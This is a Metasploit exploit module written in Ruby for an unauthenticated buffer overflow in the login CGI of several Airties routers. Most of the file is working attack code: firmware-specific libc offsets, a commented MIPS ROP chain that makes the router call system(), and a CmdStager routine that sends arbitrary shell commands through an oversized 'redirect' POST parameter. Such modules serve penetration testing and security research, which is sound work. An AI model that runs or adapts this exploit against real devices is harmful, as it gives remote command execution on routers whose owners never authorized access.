##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
 
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Airties login-cgi Buffer Overflow',
      'Description'    => %q{
        This module exploits a remote buffer overflow vulnerability on several Airties routers.
        The vulnerability exists in the handling of HTTP queries to the login cgi with long
        redirect parametres. The vulnerability doesn't require authentication. This module has
        been tested successfully on the AirTies_Air5650v3TT_FW_1.0.2.0.bin firmware with emulation.
        Other versions such as the Air6372, Air5760, Air5750, Air5650TT, Air5453, Air5444TT,
        Air5443, Air5442, Air5343, Air5342, Air5341, Air5021 are also reported as vulnerable.
      },
      'Author'         =>
        [
          'Batuhan Burakcin <batuhan[at]bmicrosystems.com>', # discovered the vulnerability
          'Michael Messner <devnull[at]s3cur1ty.de>' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'Platform'       => ['linux'],
      'Arch'           => ARCH_MIPSBE,
      'References'     =>
        [
          ['EDB', '36577'],
          ['URL', 'http://www.bmicrosystems.com/blog/exploiting-the-airties-air-series/'], #advisory
          ['URL', 'http://www.bmicrosystems.com/exploits/airties5650tt.txt'] #PoC
        ],
      'Targets'        =>
        [
          [ 'AirTies_Air5650v3TT_FW_1.0.2.0',
            {
              'Offset'         => 359,
              'LibcBase'       => 0x2aad1000,
              'RestoreReg'     => 0x0003FE20, # restore s-registers
              'System'         => 0x0003edff, # address of system-1
              'CalcSystem'     => 0x000111EC, # calculate the correct address of system
              'CallSystem'     => 0x00041C10, # call our system
              'PrepareSystem'  => 0x000215b8  # prepare $a0 for our system call
            }
          ]
        ],
      'DisclosureDate'  => 'Mar 31 2015',
      'DefaultTarget'   => 0))
 
      deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOUR')
  end
 
  def check
    begin
      res = send_request_cgi({
        'uri'     => '/cgi-bin/login',
        'method'  => 'GET'
      })
 
      if res && [200, 301, 302].include?(res.code) && res.body.to_s =~ /login.html\?ErrorCode=2/
        return Exploit::CheckCode::Detected
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end
 
    Exploit::CheckCode::Unknown
  end
 
  def exploit
    print_status("#{peer} - Accessing the vulnerable URL...")
 
    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable URL")
    end
 
    print_status("#{peer} - Exploiting...")
    execute_cmdstager(
      :flavour  => :echo,
      :linemax => 100
    )
  end
 
  def prepare_shellcode(cmd)
    shellcode = rand_text_alpha_upper(target['Offset'])                    # padding
    shellcode << [target['LibcBase'] + target['RestoreReg']].pack("N")     # restore registers with controlled values
 
                 # 0003FE20                 lw      $ra, 0x48+var_4($sp)
                 # 0003FE24                 lw      $s7, 0x48+var_8($sp)
                 # 0003FE28                 lw      $s6, 0x48+var_C($sp)
                 # 0003FE2C                 lw      $s5, 0x48+var_10($sp)
                 # 0003FE30                 lw      $s4, 0x48+var_14($sp)
                 # 0003FE34                 lw      $s3, 0x48+var_18($sp)
                 # 0003FE38                 lw      $s2, 0x48+var_1C($sp)
                 # 0003FE3C                 lw      $s1, 0x48+var_20($sp)
                 # 0003FE40                 lw      $s0, 0x48+var_24($sp)
                 # 0003FE44                 jr      $ra
                 # 0003FE48                 addiu   $sp, 0x48
 
    shellcode << rand_text_alpha_upper(36)                                 # padding
    shellcode << [target['LibcBase'] + target['System']].pack('N')         # s0 - system address-1
    shellcode << rand_text_alpha_upper(16)                                 # unused registers $s1 - $s4
    shellcode << [target['LibcBase'] + target['CallSystem']].pack('N')     # $s5 - call system
 
                 # 00041C10                 move    $t9, $s0
                 # 00041C14                 jalr    $t9
                 # 00041C18                 nop
 
    shellcode << rand_text_alpha_upper(8)                                  # unused registers $s6 - $s7
    shellcode << [target['LibcBase'] + target['PrepareSystem']].pack('N')  # write sp to $a0 -> parametre for call to system
 
                 # 000215B8                 addiu   $a0, $sp, 0x20
                 # 000215BC                 lw      $ra, 0x1C($sp)
                 # 000215C0                 jr      $ra
                 # 000215C4                 addiu   $sp, 0x20
 
    shellcode << rand_text_alpha_upper(28)                                 # padding
    shellcode << [target['LibcBase'] + target['CalcSystem']].pack('N')     # add 1 to s0 (calculate system address)
 
                 # 000111EC                 move    $t9, $s5
                 # 000111F0                 jalr    $t9
                 # 000111F4                 addiu   $s0, 1
 
    shellcode << cmd
  end
 
  def execute_command(cmd, opts)
    shellcode = prepare_shellcode(cmd)
    begin
      res = send_request_cgi({
        'method' => 'POST',
        'uri'     => '/cgi-bin/login',
        'encode_params' => false,
        'vars_post' => {
          'redirect' => shellcode,
          'user'     => rand_text_alpha(5),
          'password' => rand_text_alpha(8)
        }
      })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end
end
